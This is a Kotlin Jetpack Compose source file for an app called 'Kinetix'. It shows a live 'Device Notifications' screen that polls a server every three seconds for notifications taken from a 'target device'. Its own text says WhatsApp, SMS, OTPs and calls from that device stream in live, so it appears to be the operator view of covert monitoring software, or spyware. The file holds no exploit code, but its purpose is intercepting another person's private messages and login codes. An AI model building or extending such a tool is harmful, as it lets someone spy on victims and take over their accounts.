package com.example.kinetix.ui.features

import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.core.*
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.LazyRow
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.*

data class ModernNotification(
    val id: String,
    val app: String,
    val packageName: String,
    val title: String,
    val body: String,
    val timeFormatted: String,
    val exactTimeFormatted: String,
    val timestamp: Long,
    val iconColor: Color,
    val icon: androidx.compose.ui.graphics.vector.ImageVector
)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun NotificationsScreen(deviceId: String, onBack: () -> Unit) {
    val context = LocalContext.current
    val clipboardManager = LocalClipboardManager.current
    val coroutineScope = rememberCoroutineScope()
    val notifications = remember { mutableStateListOf<ModernNotification>() }
    var selectedFilter by remember { mutableStateOf("All") }
    var isLoading by remember { mutableStateOf(false) }
    var copiedMessage by remember { mutableStateOf<String?>(null) }

    fun formatNotificationTime(timestamp: Long): String {
        if (timestamp <= 0) return "Just now"
        val now = System.currentTimeMillis()
        val diffSeconds = (now - timestamp) / 1000
        val diffMinutes = diffSeconds / 60
        val diffHours = diffMinutes / 60

        return when {
            diffSeconds < 15 -> "Just now"
            diffSeconds < 60 -> "${diffSeconds}s ago"
            diffMinutes < 60 -> "${diffMinutes}m ago"
            diffHours < 24 -> "${diffHours}h ago"
            else -> SimpleDateFormat("MMM d", Locale.getDefault()).format(Date(timestamp))
        }
    }

    fun formatExactTime(timestamp: Long): String {
        if (timestamp <= 0) return SimpleDateFormat("h:mm a", Locale.getDefault()).format(Date())
        return SimpleDateFormat("h:mm:ss a", Locale.getDefault()).format(Date(timestamp))
    }

    suspend fun fetchLiveNotifications() {
        withContext(Dispatchers.IO) {
            val client = com.example.kinetix.network.KinetixApiClient(context)
            val res = client.getNotifications(deviceId)
            if (res.isSuccess) {
                val arr = res.getOrNull()
                if (arr != null) {
                    val list = mutableListOf<ModernNotification>()
                    for (i in 0 until arr.length()) {
                        val item = arr.getJSONObject(i)
                        val pkg = item.optString("packageName", "System")
                        val ts = item.optLong("timestamp", System.currentTimeMillis())

                        val (friendlyApp, appColor, appIcon) = when {
                            pkg.contains("whatsapp", ignoreCase = true) -> Triple("WhatsApp", Color(0xFF25D366), Icons.Default.Chat)
                            pkg.contains("telegram", ignoreCase = true) -> Triple("Telegram", Color(0xFF0088CC), Icons.Default.Send)
                            pkg.contains("instagram", ignoreCase = true) -> Triple("Instagram", Color(0xFFE1306C), Icons.Default.CameraAlt)
                            pkg.contains("facebook", ignoreCase = true) || pkg.contains("katana", ignoreCase = true) -> Triple("Facebook", Color(0xFF1877F2), Icons.Default.ThumbUp)
                            pkg.contains("twitter", ignoreCase = true) || pkg.contains("x.android", ignoreCase = true) -> Triple("X / Twitter", Color(0xFF1DA1F2), Icons.Default.Tag)
                            pkg.contains("messaging", ignoreCase = true) || pkg.contains("mms", ignoreCase = true) -> Triple("Messages (SMS)", Color(0xFF1976D2), Icons.Default.Message)
                            pkg.contains("gm", ignoreCase = true) || pkg.contains("mail", ignoreCase = true) -> Triple("Gmail", Color(0xFFEA4335), Icons.Default.Mail)
                            pkg.contains("dialer", ignoreCase = true) || pkg.contains("phone", ignoreCase = true) -> Triple("Phone Call", Color(0xFF34A853), Icons.Default.Call)
                            pkg.contains("youtube", ignoreCase = true) -> Triple("YouTube", Color(0xFFFF0000), Icons.Default.PlayArrow)
                            pkg.contains("sentry", ignoreCase = true) -> Triple("Sentry Agent", Color(0xFF673AB7), Icons.Default.Security)
                            pkg.contains("android", ignoreCase = true) || pkg.contains("system", ignoreCase = true) -> Triple("Android System", Color(0xFF607D8B), Icons.Default.PhoneAndroid)
                            else -> Triple(
                                pkg.substringAfterLast('.').replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString() },
                                Color(0xFF3F51B5),
                                Icons.Default.Notifications
                            )
                        }

                        list.add(
                            ModernNotification(
                                id = "${item.optString("id", "notif_$i")}_$i",
                                app = friendlyApp,
                                packageName = pkg,
                                title = item.optString("title", "Alert"),
                                body = item.optString("body", ""),
                                timeFormatted = formatNotificationTime(ts),
                                exactTimeFormatted = formatExactTime(ts),
                                timestamp = ts,
                                iconColor = appColor,
                                icon = appIcon
                            )
                        )
                    }

                    withContext(Dispatchers.Main) {
                        notifications.clear()
                        notifications.addAll(list)
                    }
                }
            }
        }
    }

    LaunchedEffect(deviceId) {
        while (true) {
            fetchLiveNotifications()
            delay(3000)
        }
    }

    val availableApps = remember(notifications.toList()) {
        listOf("All") + notifications.map { it.app }.distinct()
    }

    val filteredList = remember(notifications.toList(), selectedFilter) {
        if (selectedFilter == "All") {
            notifications.toList()
        } else {
            notifications.filter { it.app == selectedFilter }
        }
    }

    // Pulsing live stream dot animation
    val infiniteTransition = rememberInfiniteTransition(label = "pulse")
    val pulseAlpha by infiniteTransition.animateFloat(
        initialValue = 0.3f,
        targetValue = 1.0f,
        animationSpec = infiniteRepeatable(
            animation = tween(1000, easing = LinearEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "pulseAlpha"
    )

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Column {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text(
                                text = "Device Notifications",
                                fontWeight = FontWeight.ExtraBold,
                                fontSize = 19.sp
                            )
                        }
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            modifier = Modifier.padding(top = 2.dp)
                        ) {
                            Box(
                                modifier = Modifier
                                    .size(8.dp)
                                    .clip(CircleShape)
                                    .background(Color(0xFF4CAF50).copy(alpha = pulseAlpha))
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = "${notifications.size} Total • Live Stream Active",
                                style = MaterialTheme.typography.bodySmall,
                                color = MaterialTheme.colorScheme.onSurfaceVariant,
                                fontWeight = FontWeight.SemiBold
                            )
                        }
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                actions = {
                    IconButton(onClick = {
                        coroutineScope.launch {
                            withContext(Dispatchers.IO) {
                                val client = com.example.kinetix.network.KinetixApiClient(context)
                                client.clearNotifications(deviceId)
                            }
                            notifications.clear()
                            fetchLiveNotifications()
                        }
                    }) {
                        Icon(
                            Icons.Default.DeleteOutline,
                            contentDescription = "Clear All",
                            tint = MaterialTheme.colorScheme.error
                        )
                    }
                    IconButton(onClick = {
                        coroutineScope.launch {
                            isLoading = true
                            fetchLiveNotifications()
                            isLoading = false
                        }
                    }) {
                        Icon(Icons.Default.Refresh, contentDescription = "Refresh")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.surface
                )
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(horizontal = 16.dp)
        ) {
            // Copied snackbar feedback
            AnimatedVisibility(visible = copiedMessage != null, enter = fadeIn(), exit = fadeOut()) {
                Surface(
                    color = Color(0xFF1E1E1E),
                    shape = RoundedCornerShape(12.dp),
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(vertical = 6.dp)
                ) {
                    Row(
                        modifier = Modifier.padding(horizontal = 14.dp, vertical = 8.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(Icons.Default.CheckCircle, contentDescription = null, tint = Color(0xFF4CAF50), modifier = Modifier.size(16.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(copiedMessage ?: "", color = Color.White, fontSize = 12.sp, fontWeight = FontWeight.SemiBold)
                    }
                }
            }

            // Modern App Filter Chips (When multiple apps exist)
            if (availableApps.size > 2) {
                LazyRow(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(vertical = 8.dp),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    items(availableApps) { appName ->
                        val isSelected = selectedFilter == appName
                        val count = if (appName == "All") notifications.size else notifications.count { it.app == appName }
                        Surface(
                            onClick = { selectedFilter = appName },
                            shape = RoundedCornerShape(20.dp),
                            color = if (isSelected) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f),
                            shadowElevation = if (isSelected) 3.dp else 0.dp
                        ) {
                            Row(
                                modifier = Modifier.padding(horizontal = 14.dp, vertical = 8.dp),
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Text(
                                    text = appName,
                                    color = if (isSelected) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface,
                                    fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Medium,
                                    fontSize = 13.sp
                                )
                                Spacer(modifier = Modifier.width(6.dp))
                                Surface(
                                    shape = CircleShape,
                                    color = if (isSelected) MaterialTheme.colorScheme.onPrimary.copy(alpha = 0.25f) else MaterialTheme.colorScheme.outline.copy(alpha = 0.2f)
                                ) {
                                    Text(
                                        text = "$count",
                                        color = if (isSelected) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurfaceVariant,
                                        fontSize = 11.sp,
                                        fontWeight = FontWeight.Bold,
                                        modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
                                    )
                                }
                            }
                        }
                    }
                }
            }

            Spacer(modifier = Modifier.height(4.dp))

            if (filteredList.isEmpty()) {
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(bottom = 64.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Column(
                        horizontalAlignment = Alignment.CenterHorizontally,
                        modifier = Modifier.padding(24.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .size(88.dp)
                                .clip(CircleShape)
                                .background(MaterialTheme.colorScheme.primaryContainer.copy(alpha = 0.4f)),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(
                                Icons.Default.NotificationsNone,
                                contentDescription = null,
                                modifier = Modifier.size(44.dp),
                                tint = MaterialTheme.colorScheme.primary
                            )
                        }
                        Spacer(modifier = Modifier.height(18.dp))
                        Text(
                            "No Notifications Yet",
                            fontWeight = FontWeight.ExtraBold,
                            fontSize = 18.sp,
                            color = MaterialTheme.colorScheme.onSurface
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            "Incoming WhatsApp, SMS, OTPs, and calls from the target device will stream here live with exact timestamps.",
                            style = MaterialTheme.typography.bodyMedium,
                            color = MaterialTheme.colorScheme.onSurfaceVariant,
                            textAlign = androidx.compose.ui.text.style.TextAlign.Center
                        )
                    }
                }
            } else {
                LazyColumn(
                    modifier = Modifier.fillMaxSize(),
                    verticalArrangement = Arrangement.spacedBy(12.dp),
                    contentPadding = PaddingValues(top = 8.dp, bottom = 24.dp)
                ) {
                    items(filteredList, key = { it.id }) { notif ->
                        Card(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clickable {
                                    val fullContent = "${notif.app} - ${notif.title}\n${notif.body}\nTime: ${notif.exactTimeFormatted}"
                                    clipboardManager.setText(AnnotatedString(fullContent))
                                    copiedMessage = "Copied to clipboard"
                                    coroutineScope.launch {
                                        delay(2000)
                                        copiedMessage = null
                                    }
                                },
                            shape = RoundedCornerShape(20.dp),
                            colors = CardDefaults.cardColors(
                                containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.40f)
                            ),
                            elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
                        ) {
                            Column(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(16.dp)
                            ) {
                                // Top Header Row: App Icon + App Name + Live Timestamps
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Row(
                                        verticalAlignment = Alignment.CenterVertically,
                                        modifier = Modifier.weight(1f, fill = false)
                                    ) {
                                        Box(
                                            modifier = Modifier
                                                .size(38.dp)
                                                .clip(RoundedCornerShape(10.dp))
                                                .background(notif.iconColor.copy(alpha = 0.15f)),
                                            contentAlignment = Alignment.Center
                                        ) {
                                            Icon(
                                                notif.icon,
                                                contentDescription = null,
                                                tint = notif.iconColor,
                                                modifier = Modifier.size(22.dp)
                                            )
                                        }
                                        Spacer(modifier = Modifier.width(10.dp))
                                        Column {
                                            Text(
                                                text = notif.app,
                                                fontWeight = FontWeight.ExtraBold,
                                                fontSize = 15.sp,
                                                color = notif.iconColor
                                            )
                                            Text(
                                                text = notif.packageName,
                                                fontSize = 11.sp,
                                                color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.7f),
                                                maxLines = 1
                                            )
                                        }
                                    }

                                    // Time Stamp Pill
                                    Surface(
                                        shape = RoundedCornerShape(12.dp),
                                        color = MaterialTheme.colorScheme.surface,
                                        border = androidx.compose.foundation.BorderStroke(1.dp, MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.5f))
                                    ) {
                                        Row(
                                            modifier = Modifier.padding(horizontal = 10.dp, vertical = 4.dp),
                                            verticalAlignment = Alignment.CenterVertically
                                        ) {
                                            Icon(
                                                Icons.Default.AccessTime,
                                                contentDescription = null,
                                                modifier = Modifier.size(13.dp),
                                                tint = MaterialTheme.colorScheme.primary
                                            )
                                            Spacer(modifier = Modifier.width(5.dp))
                                            Column(horizontalAlignment = Alignment.End) {
                                                Text(
                                                    text = notif.timeFormatted,
                                                    fontSize = 11.sp,
                                                    fontWeight = FontWeight.Bold,
                                                    color = MaterialTheme.colorScheme.primary
                                                )
                                                Text(
                                                    text = notif.exactTimeFormatted,
                                                    fontSize = 9.sp,
                                                    color = MaterialTheme.colorScheme.onSurfaceVariant
                                                )
                                            }
                                        }
                                    }
                                }

                                Spacer(modifier = Modifier.height(12.dp))

                                // Notification Sender / Title
                                Text(
                                    text = notif.title,
                                    fontWeight = FontWeight.Bold,
                                    fontSize = 16.sp,
                                    color = MaterialTheme.colorScheme.onSurface
                                )

                                // Notification Body / Message Text
                                if (notif.body.isNotEmpty() && notif.body != notif.title) {
                                    Spacer(modifier = Modifier.height(4.dp))
                                    Text(
                                        text = notif.body,
                                        style = MaterialTheme.typography.bodyMedium,
                                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                                        lineHeight = 20.sp
                                    )
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
